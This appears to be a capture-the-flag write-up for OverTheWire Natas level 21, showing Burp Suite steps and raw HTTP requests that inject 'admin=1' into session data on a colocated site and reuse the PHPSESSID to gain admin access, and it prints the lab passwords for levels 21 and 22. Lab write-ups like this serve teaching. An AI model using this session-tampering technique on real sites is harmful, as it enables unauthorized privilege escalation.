# Natas CTF Solutions  

## Natas Level 21  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit session-based authentication using **session manipulation** across a colocated website.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas21.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas21`  
- **Password:** Use the password from Natas Level 20:  
```
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```  

![Home_Page](https://github.com/user-attachments/assets/44d7df16-d152-46d3-ad46-e6f2e4e9cb55)
![Source_Code](https://github.com/user-attachments/assets/15c96788-0404-413a-a957-aef651a9cdaf)

---

### **Step 3: Discover the Colocated Website**  
There’s a second site linked to this level:  
```  
http://natas21-experimenter.natas.labs.overthewire.org  
```  
- The **colocated site** is used to manipulate session data.  

![Colocated_Site](https://github.com/user-attachments/assets/a3cc4e99-65dd-4790-8a9e-143056136f46)
![Source_Code](https://github.com/user-attachments/assets/4f1aa994-5005-4432-9f59-0e99a546d90c)

---

### **Step 4: Analyze the Webpage**  
- The experimenter site sets session data using `POST` requests.  
- The session data is stored using key-value pairs.  

---

### **Step 5: Exploit Using Burp Suite**  
1. Open **Burp Suite**.  
2. Intercept a `POST` request to the experimenter site:  
```
http://natas21-experimenter.natas.labs.overthewire.org/index.php
```
3. Modify the payload to:  
```  
admin=1  
```
![image](https://github.com/user-attachments/assets/88fc6d33-821b-4978-aab1-c9f9dba66220)

4. Send the modified request using **Repeater**.  

✅ Example Request:  
```http
POST /index.php?debug HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=SESSION_ID

admin=1
```
![image](https://github.com/user-attachments/assets/e56feeb4-8ce2-4c87-af55-23ed097455a6)

---

### **Step 6: Capture the Session ID**  
- After sending the request, the response will return an updated session ID.  
- Copy the `PHPSESSID` value.  
![image](https://github.com/user-attachments/assets/c5c2c9e8-dcc2-48af-94ff-a4c84ea98d31)
![image](https://github.com/user-attachments/assets/8dbcdfa7-ba40-46eb-863a-40ad18bd73a8)

---

### **Step 7: Use the Session on Natas21**  
1. Open a new request to:  
```  
http://natas21.natas.labs.overthewire.org/index.php?debug  
```  
2. Attach the modified session ID in the `Cookie` header:  
```http
GET /index.php?debug HTTP/1.1
Host: natas21.natas.labs.overthewire.org
Cookie: PHPSESSID=SESSION_ID
```

✅ If successful, the server will recognize the session as admin and reveal the password!  

![Output](https://github.com/user-attachments/assets/4200748c-6dda-4204-8cd4-80744960b468)

---

### **Step 8: Output**  
After submitting the session, the output will reveal the password for the next level:  
```  
The password for natas22 is: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz  
```  

---

### **✅ Password for Natas Level 22**  
```
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```  

---

## 💡 **Lessons Learned**  
✔️ **Session Hijacking:** Session data can be manipulated if stored insecurely.  
✔️ **Privilege Escalation:** Direct manipulation of session keys can bypass access control.  
✔️ **Session Binding:** Sessions tied to external domains may expose security flaws.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Experimenter Site | ![Colocated_Site](https://github.com/user-attachments/assets/a3cc4e99-65dd-4790-8a9e-143056136f46) |  
| Step 5 – BurpSuite Request | ![image](https://github.com/user-attachments/assets/c5c2c9e8-dcc2-48af-94ff-a4c84ea98d31) |  
| Step 7 – Found Password | ![Output](https://github.com/user-attachments/assets/4200748c-6dda-4204-8cd4-80744960b468) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 22**:  
👉 [http://natas22.natas.labs.overthewire.org](http://natas22.natas.labs.overthewire.org)  

---
